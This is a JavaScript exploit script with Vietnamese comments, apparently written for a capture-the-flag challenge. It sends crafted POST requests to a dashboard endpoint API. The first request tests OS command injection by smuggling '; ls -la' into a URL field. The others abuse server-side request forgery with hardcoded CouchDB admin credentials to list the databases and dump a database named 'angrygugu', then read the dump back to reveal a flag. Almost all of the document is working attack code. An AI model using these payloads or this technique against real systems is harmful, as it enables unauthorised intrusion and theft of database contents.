//Đoạn code để kiểm tra xem có phải lỗ hổng OS Command Injection hay không
fetch('/api/dashboard/endpoints', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        url: "http://127.0.0.1; ls -la", 
        sector: "Testing",
        status: "active"
    })
})
.then(res => res.json())
.then(data => console.log("Kết quả thử OS Command Injection:", data));

//Đoạn code để check _all_dbs của CouchDB
fetch('/api/dashboard/endpoints', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
        url: "http://c0uch_4dm1n:R8vN2qK7pT4mX9Za@127.0.0.1:5984/_all_dbs", 
        sector: "Scan", 
        status: "active" 
    })
});

//Đoạn code để đọc dữ liệu trong database angrygugu
(async () => {
    console.log("[*] Tiến hành đột nhập kho báu 'angrygugu'...");
    
    // 1. Tạo lệnh ép server đọc toàn bộ nội dung của database
    await fetch('/api/dashboard/endpoints', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            url: "http://c0uch_4dm1n:R8vN2qK7pT4mX9Za@127.0.0.1:5984/angrygugu/_all_docs?include_docs=true", 
            sector: "Pwned", 
            status: "active" 
        })
    });

    console.log("[-] Đang ép CouchDB nôn dữ liệu...");
    await new Promise(r => setTimeout(r, 1500)); // Đợi 1.5 giây cho server lấy data

    // 2. Kéo dữ liệu về và in ra màn hình
    let resGet = await fetch('/api/dashboard/endpoints');
    let data = await resGet.json();

    // Tìm đúng cái URL vừa tiêm
    let target = data.find(e => e.url.includes('angrygugu/_all_docs'));
    
    if (target && target.responseData) {
        console.log("\n🚩 [ BINGO - FLAG LỘ DIỆN ] 🚩\n");
        console.log(JSON.stringify(target.responseData, null, 2));
    } else {
        console.log("[!] Có lỗi xảy ra, không đọc được responseData. Hãy thử chạy lại đoạn code này!");
    }
})();